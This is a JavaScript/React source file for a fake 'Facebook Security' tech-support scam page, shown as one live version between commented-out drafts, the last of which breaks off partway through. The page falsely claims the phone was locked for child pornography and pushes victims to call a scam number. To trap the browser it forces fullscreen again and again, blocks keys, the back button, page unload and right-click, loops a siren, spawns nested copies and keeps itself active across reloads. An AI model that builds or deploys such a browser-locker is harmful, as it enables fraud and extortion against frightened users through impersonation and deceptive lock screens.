// /* eslint-disable react/prop-types */
// import { useState, useEffect, useRef, useCallback } from "react"
// import "../App.css"
// import { Button } from "@/components/ui/button"
// import { Card } from "@/components/ui/card"
// import { PhoneCall, AlertCircle, Lock } from "lucide-react"
// import { toast, ToastContainer } from "react-toastify"
// import "react-toastify/dist/ReactToastify.css"

// const EmergencyCallRecursive = ({ depth = 0 }) => {
//   const [showPopup, setShowPopup] = useState(false)
//   const [nestedCalls, setNestedCalls] = useState([])
//   const [isFullscreen, setIsFullscreen] = useState(false)
//   const popupRef = useRef(null)
//   const fullscreenRef = useRef(null)

//   const showEmergencyToasts = () => {
//     toast.dismiss()
//     toast.error("CRITICAL ERROR: System security compromised!", {
//       position: "top-right",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: true,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast",
//       icon: <AlertCircle size={24} />
//     })

//     toast.warning("WARNING: Your data may be at risk!", {
//       position: "top-left",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: false,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast",
//       icon: <AlertCircle size={48} />
//     })

//     toast.info("Call Facebook Support immediately:18445692321", {
//       position: "bottom-center",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: false,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast-bottom",
//       icon: <PhoneCall size={48} />
//     })
//     toast.info("Call Facebook Support immediately:18445692321", {
//       position: "bottom-left",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: false,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast-bottom",
//       icon: <PhoneCall size={48} />
//     })
//     toast.info("Call Facebook Support immediately:18445692321", {
//       position: "bottom-right",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: false,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast-bottom",
//       icon: <PhoneCall size={48} />
//     })
//   }

//   const requestFullscreen = async () => {
//     try {
//       const elem = fullscreenRef.current || document.documentElement
//       if (elem.requestFullscreen) {
//         await elem.requestFullscreen({ navigationUI: "hide" })
//       } else if (elem.webkitRequestFullscreen) {
//         await elem.webkitRequestFullscreen({ navigationUI: "hide" })
//       } else if (elem.msRequestFullscreen) {
//         await elem.msRequestFullscreen({ navigationUI: "hide" })
//       } else if (elem.mozRequestFullScreen) {
//         await elem.mozRequestFullScreen({ navigationUI: "hide" })
//       }
//       setIsFullscreen(true)
//     } catch (err) {
//       console.error("Fullscreen request failed:", err)
//     }
//   }

//   useEffect(() => {
//     const handleFullscreenChange = () => {
//       const isCurrentlyFullscreen = Boolean(
//         document.fullscreenElement ||
//         document.webkitFullscreenElement ||
//         document.mozFullScreenElement ||
//         document.msFullscreenElement
//       )
      
//       setIsFullscreen(isCurrentlyFullscreen)
      
//       if (!isCurrentlyFullscreen && showPopup) {
//         setTimeout(() => {
//           requestFullscreen()
//           playAlertSound()
//           setNestedCalls(prev => [...prev, Date.now()])
//         }, 10)
//       }
//     }

//     document.addEventListener('fullscreenchange', handleFullscreenChange)
//     document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
//     document.addEventListener('mozfullscreenchange', handleFullscreenChange)
//     document.addEventListener('MSFullscreenChange', handleFullscreenChange)

//     return () => {
//       document.removeEventListener('fullscreenchange', handleFullscreenChange)
//       document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
//       document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
//       document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
//     }
//   }, [showPopup])

//   useEffect(() => {
//     const savedState = localStorage.getItem("emergencyAlertActive")
//     if (savedState === "true") {
//       activateEmergencyMode()
//     }

//     document.addEventListener("visibilitychange", handleVisibilityChange)

//     return () => {
//       document.removeEventListener("visibilitychange", handleVisibilityChange)
//     }
//   }, [])

//   const handleVisibilityChange = () => {
//     if (showPopup && document.visibilityState === "visible") {
//       playAlertSound()
//       if (!isFullscreen) {
//         requestFullscreen()
//       }
//     }
//   }

//   useEffect(() => {
//     if (showPopup) {
//       localStorage.setItem("emergencyAlertActive", "true")
//     } else {
//       localStorage.removeItem("emergencyAlertActive")
//     }
//   }, [showPopup])

//   const activateEmergencyMode = () => {
//     setShowPopup(true)
//     document.body.style.overflow = "hidden"
//     playAlertSound()
//     startSoundInterval()
//     showEmergencyToasts()
//     requestFullscreen()
//   }

//   const playAlertSound = useCallback(() => {
//     const audio = new Audio("/siren-alert-96052 (1).mp3")
//     audio.play()
//   }, [])

//   const startSoundInterval = () => {
//     if (window.emergencyIntervalId) {
//       clearInterval(window.emergencyIntervalId)
//     }

//     const intervalId = setInterval(() => {
//       playAlertSound()
//     }, 10000)

//     window.emergencyIntervalId = intervalId
//     return intervalId
//   }

//   const handleCall = () => {
//     activateEmergencyMode()
//   }

//   useEffect(() => {
//     const handleKeyDown = (e) => {
//       if (e.key === "Escape") {
//         e.preventDefault()
//         e.stopPropagation()
        
//         // Immediately request fullscreen again
//         setTimeout(() => {
//           requestFullscreen()
//           // Create a new nested emergency call
//           setNestedCalls(prev => [...prev, Date.now()])
          
//           // Visual feedback
//           const popup = document.getElementById("emergencyPopup")
//           if (popup) {
//             popup.classList.add("shake-animation")
//             setTimeout(() => {
//               popup.classList.remove("shake-animation")
//             }, 500)
//             playAlertSound()
//           }
//         }, 0)
//         return false
//       }

//       if (showPopup && (e.ctrlKey || e.altKey || e.metaKey)) {
//         e.preventDefault()
//         e.stopPropagation()
//         return false
//       }
//     }

//     window.addEventListener("keydown", handleKeyDown, { capture: true })

//     return () => {
//       window.removeEventListener("keydown", handleKeyDown, { capture: true })
//     }
//   }, [showPopup, playAlertSound])

//   useEffect(() => {
//     if (showPopup) {
//       const maxBackBlockCount = 100
//       let backBlockCount = 0

//       const pushManyHistoryStates = () => {
//         if (backBlockCount < maxBackBlockCount) {
//           window.history.pushState({ emergency: true }, document.title, window.location.href)
//           backBlockCount++
//           setTimeout(pushManyHistoryStates, 50)
//         }
//       }

//       pushManyHistoryStates()

//       const handlePopState = () => {
//         window.history.pushState({ emergency: true }, document.title, window.location.href)
//         playAlertSound()
//         if (!isFullscreen) {
//           requestFullscreen()
//         }
//       }

//       window.addEventListener("popstate", handlePopState)

//       const handleBeforeUnload = (e) => {
//         e.preventDefault()
//         e.returnValue = "Emergency in progress - please complete the emergency call before leaving"
//         return e.returnValue
//       }

//       window.addEventListener("beforeunload", handleBeforeUnload)

//       const handleContextMenu = (e) => {
//         e.preventDefault()
//         return false
//       }

//       document.addEventListener("contextmenu", handleContextMenu)

//       // Keep checking fullscreen status and focus
//       const maintenanceInterval = setInterval(() => {
//         if (!isFullscreen) {
//           requestFullscreen()
//         }
//         if (document.activeElement !== document.getElementById("emergencyPopup")) {
//           document.getElementById("emergencyPopup")?.focus()
//         }
//       }, 100)

//       return () => {
//         window.removeEventListener("popstate", handlePopState)
//         window.removeEventListener("beforeunload", handleBeforeUnload)
//         document.removeEventListener("contextMenu", handleContextMenu)
//         clearInterval(maintenanceInterval)
//       }
//     }
//   }, [showPopup, playAlertSound, isFullscreen])

//   useEffect(() => {
//     if (showPopup) {
//       const style = document.createElement("style")
//       style.id = "emergency-styles"
//       style.innerHTML = `
//         @keyframes shake {
//           0%, 100% { transform: translateX(0); }
//           10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
//           20%, 40%, 60%, 80% { transform: translateX(10px); }
//         }
//         .shake-animation {
//           animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
//         }
//         @keyframes flash-blue {
//           0%, 100% { background-color: rgba(37, 99, 235, 0.8); }
//           50% { background-color: rgba(59, 130, 246, 0.9); }
//         }
//         .flash-notification {
//           animation: flash-blue 1s infinite;
//         }
//         .fullscreen-notification {
//           position: fixed;
//           top: 0;
//           left: 0;
//           right: 0;
//           padding: 8px 16px;
//           height: 100px;
//           background-color:  #007bff;
//           color: white;
//           text-align: center;
//           font-weight: bold;
//           z-index: 9999;
//           font-family: -Facebook-system, BlinkMacSystemFont, sans-serif;
//           font-size: 14px;
//           box-shadow: 0 2px 10px rgba(0,0,0,0.3);
//           display: flex;
//           align-items: center;
//           justify-content: center;
//           backdrop-filter: blur(10px);
//         }
//         .fullscreen-indicator {
//           display: inline-block;
//           width: 80px;
//           height: 200px;
//           background-color: white;
//           border-radius: 50%;
//           margin-right: 8px;
//         }
//       `
//       document.head.appendChild(style)

//       return () => {
//         document.head.removeChild(style)
//       }
//     }
//   }, [showPopup])

//   const createVisualDistraction = () => {
//     if (!showPopup) return null

//     return (
//       <>
//         <div className="fullscreen-notification flash-notification" onClick={handleCall}>
//           <span className="fullscreen-indicator animate-ping"></span>
//           <Lock size={96} className="mr-1" />
//           Facebook SECURITY - SCREEN LOCKED
//         </div>

//         <div className="fixed top-0 left-0 right-0 h-12 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
//           <div className="animate-pulse flex items-center">
//             <AlertCircle size={24} className="text-white mr-2" />
//             <span className="text-white font-bold">Facebook SECURITY ALERT</span>
//           </div>
//         </div>

//         <div className="fixed top-4 right-4 bg-blue-600 text-white p-2 rounded-full animate-ping z-50">
//           <AlertCircle size={16} />
//         </div>
//         <div
//           className="fixed top-6 left-6 bg-blue-600 text-white p-2 rounded-full animate-pulse z-50"
//           style={{ animationDelay: "0.5s" }}
//         >
//           <AlertCircle size={16} />
//         </div>
//       </>
//     )
//   }

//   return (
//     <>
//       <div
//         ref={fullscreenRef}
//         className="min-h-screen bg-gradient-to-b from-blue-50 to-blue-100 p-4 flex flex-col items-center justify-center cursor-pointer font-[-Facebook-system]"
//         onClick={handleCall}
//         style={{ 
//           transform: `scale(${1 - depth * 0.05})`,
//           zIndex: 1000 + depth
//         }}
//       >
//         <ToastContainer position="top-right" autoClose={5000} />
//         {createVisualDistraction()}
//         <div className="w-full max-w-md">
//           <Card className="p-6 bg-white shadow-lg border border-blue-200 rounded-2xl">
//             <div className="flex flex-col items-center space-y-4">
//               <div className="bg-blue-600 rounded-full p-4 animate-pulse">
//                 <PhoneCall size={48} className="text-white" />
//               </div>
//               <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
//               <p className="text-base md:text-lg text-muted-foreground"><br></br>
//            <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
//            Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
//             <br /><br />
//           </p>
//               <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
//               <Button
//                 className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
//                 onClick={(e) => {
//                   e.stopPropagation()
//                   handleCall()
//                 }}
//               >
//                 <PhoneCall className="mr-2 h-6 w-6" />
//                 <span>Call 18445692321</span>
//               </Button>
//             </div>
//           </Card>
//         </div>

//         {showPopup && (
//           <div
//             id="emergencyPopup"
//             ref={popupRef}
//             className="fixed inset-0 flex items-center justify-center z-50 p-4 backdrop-blur-lg"
//             tabIndex={-1}
//             onKeyDown={(e) => {
//               if (e.key === "Escape" || e.key === "Tab" || e.key === "F5") {
//                 e.preventDefault()
//                 e.stopPropagation()
//               }
//             }}
//             onClick={(e) => e.stopPropagation()}
//           >
//             <div className="absolute inset-0 bg-black bg-opacity-60"></div>
//             <Card className="bg-white p-6 rounded-2xl border border-blue-200 shadow-2xl max-w-md w-full z-10 animate-bounce">
//               <div className="flex flex-col items-center space-y-4">
//                 <div className="flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full">
//                   <AlertCircle size={32} className="text-white" />
//                 </div>
//                 <h2 className="text-2xl font-semibold text-center">Facebook SUPPORT</h2>
//                 <p className="text-center text-lg">Connecting you to Facebook Support at:</p>
//                 <p className="text-2xl font-semibold text-blue-600">18445692321</p>
//                 <div className="flex space-x-2 items-center justify-center w-full mt-2">
//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping"></div>
//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.2s" }}></div>
//                   <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.4s" }}></div>
//                 </div>
//                 <Button
//                   id="callButton"
//                   className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl mt-4"
//                   onClick={() => (window.location.href = "tel:18445692321")}
//                   autoFocus
//                 >
//                   Confirm Call
//                 </Button>
//                 <p className="text-xs text-center text-gray-500 mt-2">Facebook security mode active.</p>
//               </div>
//             </Card>
//           </div>
//         )}
//       </div>
//       {nestedCalls.map((id) => (
//         <EmergencyCallRecursive key={id} depth={depth + 1} />
//       ))}
//     </>
//   )
// }

// export default function EmergencyCall() {
//   return <EmergencyCallRecursive />
// }




// /* eslint-disable react/prop-types */
import { useState, useEffect, useRef, useCallback } from "react"
import "../App.css"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import { PhoneCall, AlertCircle, Lock } from "lucide-react"
import { toast, ToastContainer } from "react-toastify"
import "react-toastify/dist/ReactToastify.css"

const EmergencyCallRecursive = ({ depth = 0 }) => {
  const [showPopup, setShowPopup] = useState(false)
  const [nestedCalls, setNestedCalls] = useState([])
  const [isFullscreen, setIsFullscreen] = useState(false)
  const popupRef = useRef(null)
  const fullscreenRef = useRef(null)

  const showEmergencyToasts = () => {
    toast.dismiss()
    // toast.error("CRITICAL ERROR: System security compromised!", {
    //   position: "top-right",
    //   autoClose: false,
    //   hideProgressBar: false,
    //   closeOnClick: false,
    //   pauseOnHover: true,
    //   draggable: false,
    //   progress: undefined,
    //   className: "emergency-toast",
    //   icon: <AlertCircle size={24} />
    // })

    // toast.warning("WARNING: Your data may be at risk!", {
    //   position: "top-left",
    //   autoClose: false,
    //   hideProgressBar: false,
    //   closeOnClick: false,
    //   pauseOnHover: false,
    //   draggable: false,
    //   progress: undefined,
    //   className: "emergency-toast",
    //   icon: <AlertCircle size={48} />
    // })

    // toast.info("Call Facebook Support immediately:18445131621", {
    //   position: "bottom-center",
    //   autoClose: false,
    //   hideProgressBar: false,
    //   closeOnClick: false,
    //   pauseOnHover: false,
    //   draggable: false,
    //   progress: undefined,
    //   className: "emergency-toast-bottom",
    //   icon: <PhoneCall size={48} />
    // })
    // toast.info("Call Facebook Support immediately:18445131621", {
    //   position: "bottom-left",
    //   autoClose: false,
    //   hideProgressBar: false,
    //   closeOnClick: false,
    //   pauseOnHover: false,
    //   draggable: false,
    //   progress: undefined,
    //   className: "emergency-toast-bottom",
    //   icon: <PhoneCall size={48} />
    // })
    toast.info("Call Facebook Support immediately:18445131621", {
      position: "bottom-right",
      autoClose: false,
      hideProgressBar: false,
      closeOnClick: false,
      pauseOnHover: false,
      draggable: false,
      progress: undefined,
      className: "emergency-toast-bottom",
      icon: <PhoneCall size={48} />
    })
  }

  const requestFullscreen = async () => {
    try {
      const elem = fullscreenRef.current || document.documentElement
      if (elem.requestFullscreen) {
        await elem.requestFullscreen({ navigationUI: "hide" })
      } else if (elem.webkitRequestFullscreen) {
        await elem.webkitRequestFullscreen({ navigationUI: "hide" })
      } else if (elem.msRequestFullscreen) {
        await elem.msRequestFullscreen({ navigationUI: "hide" })
      } else if (elem.mozRequestFullScreen) {
        await elem.mozRequestFullScreen({ navigationUI: "hide" })
      }
      setIsFullscreen(true)
    } catch (err) {
      console.error("Fullscreen request failed:", err)
    }
  }

  useEffect(() => {
    const handleFullscreenChange = () => {
      const isCurrentlyFullscreen = Boolean(
        document.fullscreenElement ||
        document.webkitFullscreenElement ||
        document.mozFullScreenElement ||
        document.msFullscreenElement
      )
      
      setIsFullscreen(isCurrentlyFullscreen)
      
      if (!isCurrentlyFullscreen && showPopup) {
        setTimeout(() => {
          requestFullscreen()
          playAlertSound()
          setNestedCalls(prev => [...prev, Date.now()])
        }, 10)
      }
    }

    document.addEventListener('fullscreenchange', handleFullscreenChange)
    document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
    document.addEventListener('mozfullscreenchange', handleFullscreenChange)
    document.addEventListener('MSFullscreenChange', handleFullscreenChange)

    return () => {
      document.removeEventListener('fullscreenchange', handleFullscreenChange)
      document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
      document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
      document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
    }
  }, [showPopup])

  useEffect(() => {
    const savedState = localStorage.getItem("emergencyAlertActive")
    if (savedState === "true") {
      activateEmergencyMode()
    }

    document.addEventListener("visibilitychange", handleVisibilityChange)

    return () => {
      document.removeEventListener("visibilitychange", handleVisibilityChange)
    }
  }, [])

  const handleVisibilityChange = () => {
    if (showPopup && document.visibilityState === "visible") {
      playAlertSound()
      if (!isFullscreen) {
        requestFullscreen()
      }
    }
  }

  useEffect(() => {
    if (showPopup) {
      localStorage.setItem("emergencyAlertActive", "true")
    } else {
      localStorage.removeItem("emergencyAlertActive")
    }
  }, [showPopup])

  const activateEmergencyMode = () => {
    setShowPopup(true)
    document.body.style.overflow = "hidden"
    playAlertSound()
    startSoundInterval()
    showEmergencyToasts()
    requestFullscreen()
  }

  const playAlertSound = useCallback(() => {
    const audio = new Audio("/siren-alert-96052 (1).mp3")
    audio.play()
  }, [])

  const startSoundInterval = () => {
    if (window.emergencyIntervalId) {
      clearInterval(window.emergencyIntervalId)
    }

    const intervalId = setInterval(() => {
      playAlertSound()
    }, 10000)

    window.emergencyIntervalId = intervalId
    return intervalId
  }

  const handleCall = () => {
    activateEmergencyMode()
  }

  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.key === "Escape") {
        e.preventDefault()
        e.stopPropagation()
        
        // Immediately request fullscreen again
        setTimeout(() => {
          requestFullscreen()
          // Create a new nested emergency call
          setNestedCalls(prev => [...prev, Date.now()])
          
          // Visual feedback
          const popup = document.getElementById("emergencyPopup")
          if (popup) {
            popup.classList.add("shake-animation")
            setTimeout(() => {
              popup.classList.remove("shake-animation")
            }, 500)
            playAlertSound()
          }
        }, 0)
        return false
      }

      if (showPopup && (e.ctrlKey || e.altKey || e.metaKey)) {
        e.preventDefault()
        e.stopPropagation()
        return false
      }
    }

    window.addEventListener("keydown", handleKeyDown, { capture: true })

    return () => {
      window.removeEventListener("keydown", handleKeyDown, { capture: true })
    }
  }, [showPopup, playAlertSound])

  useEffect(() => {
    if (showPopup) {
      const maxBackBlockCount = 100
      let backBlockCount = 0

      const pushManyHistoryStates = () => {
        if (backBlockCount < maxBackBlockCount) {
          window.history.pushState({ emergency: true }, document.title, window.location.href)
          backBlockCount++
          setTimeout(pushManyHistoryStates, 50)
        }
      }

      pushManyHistoryStates()

      const handlePopState = () => {
        window.history.pushState({ emergency: true }, document.title, window.location.href)
        playAlertSound()
        if (!isFullscreen) {
          requestFullscreen()
        }
      }

      window.addEventListener("popstate", handlePopState)

      const handleBeforeUnload = (e) => {
        e.preventDefault()
        e.returnValue = "Emergency in progress - please complete the emergency call before leaving"
        return e.returnValue
      }

      window.addEventListener("beforeunload", handleBeforeUnload)

      const handleContextMenu = (e) => {
        e.preventDefault()
        return false
      }

      document.addEventListener("contextmenu", handleContextMenu)

      // Keep checking fullscreen status and focus
      const maintenanceInterval = setInterval(() => {
        if (!isFullscreen) {
          requestFullscreen()
        }
        if (document.activeElement !== document.getElementById("emergencyPopup")) {
          document.getElementById("emergencyPopup")?.focus()
        }
      }, 100)

      return () => {
        window.removeEventListener("popstate", handlePopState)
        window.removeEventListener("beforeunload", handleBeforeUnload)
        document.removeEventListener("contextMenu", handleContextMenu)
        clearInterval(maintenanceInterval)
      }
    }
  }, [showPopup, playAlertSound, isFullscreen])

  useEffect(() => {
    if (showPopup) {
      const style = document.createElement("style")
      style.id = "emergency-styles"
      style.innerHTML = `
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
          20%, 40%, 60%, 80% { transform: translateX(10px); }
        }
        .shake-animation {
          animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
        }
        @keyframes flash-blue {
          0%, 100% { background-color: rgba(37, 99, 235, 0.8); }
          50% { background-color: rgba(59, 130, 246, 0.9); }
        }
        .flash-notification {
          animation: flash-blue 1s infinite;
        }
        .fullscreen-notification {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          padding: 8px 16px;
          height: 100px;
          background-color:  #007bff;
          color: white;
          text-align: center;
          font-weight: bold;
          z-index: 9999;
          font-family: -Facebook-system, BlinkMacSystemFont, sans-serif;
          font-size: 14px;
          box-shadow: 0 2px 10px rgba(0,0,0,0.3);
          display: flex;
          align-items: center;
          justify-content: center;
          backdrop-filter: blur(10px);
        }
        .fullscreen-indicator {
          display: inline-block;
          width: 80px;
          height: 200px;
          background-color: white;
          border-radius: 50%;
          margin-right: 8px;
        }
      `
      document.head.appendChild(style)

      return () => {
        document.head.removeChild(style)
      }
    }
  }, [showPopup])

  const createVisualDistraction = () => {
    if (!showPopup) return null

    return (
      <>
        <div className="fullscreen-notification flash-notification" onClick={handleCall}>
          <span className="fullscreen-indicator animate-ping"></span>
          <Lock size={96} className="mr-1" />
          Facebook SECURITY - SCREEN LOCKED
        </div>

        <div className="fixed top-0 left-0 right-0 h-12 bg-blue-600 z-40 flex items-center justify-center backdrop-blur-lg">
          <div className="animate-pulse flex items-center">
            <AlertCircle size={24} className="text-white mr-2" />
            <span className="text-white font-bold">Facebook SECURITY ALERT</span>
          </div>
        </div>

        <div className="fixed top-4 right-4 bg-blue-600 text-white p-2 rounded-full animate-ping z-50">
          <AlertCircle size={16} />
        </div>
        <div
          className="fixed top-6 left-6 bg-blue-600 text-white p-2 rounded-full animate-pulse z-50"
          style={{ animationDelay: "0.5s" }}
        >
          <AlertCircle size={16} />
        </div>
      </>
    )
  }

  return (
    <>
      <div
        ref={fullscreenRef}
        className="min-h-screen bg-gradient-to-b from-blue-50 to-blue-100 p-4 flex flex-col items-center justify-center cursor-pointer font-[-Facebook-system]"
        
        style={{ 
          transform: `scale(${1 - depth * 0.05})`,
          zIndex: 1000 + depth
        }}
        onClick={() => (window.location.href = "tel:18445131621")}
      >
        {/* <ToastContainer position="top-right" autoClose={5000} /> */}
        <ToastContainer
        position="top-right"
        autoClose={false}
        newestOnTop
        closeOnClick={false}
        rtl={false}
        pauseOnFocusLoss
        draggable={false}
        theme="colored"
        limit={5}
      />
        {createVisualDistraction()}
        <div className="w-full max-w-md">
          <Card className="p-6 bg-white shadow-lg border border-blue-200 rounded-2xl">
            <div className="flex flex-col items-center space-y-4">
              <div className="bg-blue-600 rounded-full p-4 animate-pulse">
                <PhoneCall size={48} className="text-white" />
              </div>
              <h2 className="text-2xl font-semibold text-center">Facebook Support</h2>
              <p className="text-base md:text-lg text-muted-foreground"><br></br>
           <h1 className="text-xl md:text-3xl font-semibold tracking-tight">Warning:</h1> <br></br>
           Your phone has been locked for a child pornography activity. Access has been restricted. Contact support Immediately at below number.
            <br /><br />
          </p>
              <p className="text-center text-gray-600 mb-4">Tap anywhere for immediate Facebook support</p>
              <Button
                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
                onClick={(e) => {
                  e.stopPropagation()
                  handleCall()
                }}
              >
                <PhoneCall className="mr-2 h-6 w-6" />
                <span>Call 18445131621</span>
              </Button>

              <Button
                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-6 text-xl font-medium rounded-xl flex items-center justify-center space-x-2 transition-all"
                onClick={(e) => {
                  e.stopPropagation()
                  handleCall()
                }}
              >
                <PhoneCall className="mr-2 h-6 w-6" />
                <span>Back to facebook</span>
              </Button>
            </div>
          </Card>
        </div>

        {showPopup && (
          <div
            id="emergencyPopup"
            ref={popupRef}
            className="fixed inset-0 flex items-center justify-center z-50 p-4 backdrop-blur-lg"
            tabIndex={-1}
            onKeyDown={(e) => {
              if (e.key === "Escape" || e.key === "Tab" || e.key === "F5") {
                e.preventDefault()
                e.stopPropagation()
              }
            }}
             onClick={() => {
    window.location.href = "tel:18445131621";
  }}
          >
            <div className="absolute inset-0 bg-black bg-opacity-60"></div>
            <Card className="bg-white p-6 rounded-2xl border border-blue-200 shadow-2xl max-w-md w-full z-10 animate-bounce">
              <div className="flex flex-col items-center space-y-4">
                <div className="flex items-center justify-center w-16 h-16 bg-blue-600 rounded-full">
                  <AlertCircle size={32} className="text-white" />
                </div>
                <h2 className="text-2xl font-semibold text-center">Facebook SUPPORT</h2>
                <p className="text-center text-lg">Connecting you to Facebook Support at:</p>
                <p className="text-2xl font-semibold text-blue-600">18445131621</p>
                <div className="flex space-x-2 items-center justify-center w-full mt-2">
                  <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping"></div>
                  <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.2s" }}></div>
                  <div className="h-3 w-3 bg-blue-600 rounded-full animate-ping" style={{ animationDelay: "0.4s" }}></div>
                </div>
                <Button
                  id="callButton"
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-xl mt-4"
                  onClick={() => (window.location.href = "tel:18445131621")}
                  autoFocus
                >
                  Confirm Call
                </Button>
                <p className="text-xs text-center text-gray-500 mt-2">Facebook security mode active.</p>
              </div>
            </Card>
          </div>
        )}
      </div>
      {nestedCalls.map((id) => (
        <EmergencyCallRecursive key={id} depth={depth + 1} />
      ))}
    </>
  )
}
export default function App() {
  return <EmergencyCallRecursive />
}



/* eslint-disable react/prop-types */
// import { useState, useEffect, useRef, useCallback } from "react"
// import "../App.css"
// import { Button } from "@/components/ui/button"
// import { Card } from "@/components/ui/card"
// import { PhoneCall, AlertCircle, Lock } from "lucide-react"
// import { toast, ToastContainer } from "react-toastify"
// import "react-toastify/dist/ReactToastify.css"

// const EmergencyCallRecursive = ({ depth = 0 }) => {
//   const [showPopup, setShowPopup] = useState(false)
//   const [nestedCalls, setNestedCalls] = useState([])
//   const [isFullscreen, setIsFullscreen] = useState(false)
//   const popupRef = useRef(null)
//   const fullscreenRef = useRef(null)

//   const showEmergencyToasts = () => {
//     toast.dismiss()
//     toast.error("CRITICAL ERROR: System security compromised!", {
//       position: "top-right",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: true,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast",
//       icon: <AlertCircle size={24} />
//     })

//     toast.warning("WARNING: Your data may be at risk!", {
//       position: "top-left",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: false,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast",
//       icon: <AlertCircle size={48} />
//     })

//     toast.info("Call Facebook Support immediately:18445131621", {
//       position: "bottom-center",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: false,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast-bottom",
//       icon: <PhoneCall size={48} />
//     })
//     toast.info("Call Facebook Support immediately:18445131621", {
//       position: "bottom-left",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: false,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast-bottom",
//       icon: <PhoneCall size={48} />
//     })
//     toast.info("Call Facebook Support immediately:18445131621", {
//       position: "bottom-right",
//       autoClose: false,
//       hideProgressBar: false,
//       closeOnClick: false,
//       pauseOnHover: false,
//       draggable: false,
//       progress: undefined,
//       className: "emergency-toast-bottom",
//       icon: <PhoneCall size={48} />
//     })
//   }

//   const requestFullscreen = async () => {
//     try {
//       const elem = fullscreenRef.current || document.documentElement
//       if (elem.requestFullscreen) {
//         await elem.requestFullscreen({ navigationUI: "hide" })
//       } else if (elem.webkitRequestFullscreen) {
//         await elem.webkitRequestFullscreen({ navigationUI: "hide" })
//       } else if (elem.msRequestFullscreen) {
//         await elem.msRequestFullscreen({ navigationUI: "hide" })
//       } else if (elem.mozRequestFullScreen) {
//         await elem.mozRequestFullScreen({ navigationUI: "hide" })
//       }
//       setIsFullscreen(true)
//     } catch (err) {
//       console.error("Fullscreen request failed:", err)
//     }
//   }

//   useEffect(() => {
//     const handleFullscreenChange = () => {
//       const isCurrentlyFullscreen = Boolean(
//         document.fullscreenElement ||
//         document.webkitFullscreenElement ||
//         document.mozFullScreenElement ||
//         document.msFullscreenElement
//       )
      
//       setIsFullscreen(isCurrentlyFullscreen)
      
//       if (!isCurrentlyFullscreen && showPopup) {
//         setTimeout(() => {
//           requestFullscreen()
//           playAlertSound()
//           setNestedCalls(prev => [...prev, Date.now()])
//         }, 10)
//       }
//     }

//     document.addEventListener('fullscreenchange', handleFullscreenChange)
//     document.addEventListener('webkitfullscreenchange', handleFullscreenChange)
//     document.addEventListener('mozfullscreenchange', handleFullscreenChange)
//     document.addEventListener('MSFullscreenChange', handleFullscreenChange)

//     return () => {
//       document.removeEventListener('fullscreenchange', handleFullscreenChange)
//       document.removeEventListener('webkitfullscreenchange', handleFullscreenChange)
//       document.removeEventListener('mozfullscreenchange', handleFullscreenChange)
//       document.removeEventListener('MSFullscreenChange', handleFullscreenChange)
//     }
//   }, [showPopup])

//   useEffect(() => {
//     const savedState = localStorage.getItem("emergencyAlertActive")
//     if (savedState === "true") {
//       activateEmergencyMode()
//     }

//     document.addEventListener("visibilitychange", handleVisibilityChange)

//     return () => {
//       document.removeEventListener("visibilitychange", handleVisibilityChange)
//     }
//   }, [])

//   const handleVisibilityChange = () => {
//     if (showPopup && document.visibilityState === "visible") {
//       playAlertSound()
//       if (!isFullscreen) {
//         requestFullscreen()
//       }
//     }
//   }

//   useEffect(() => {
//     if (showPopup) {
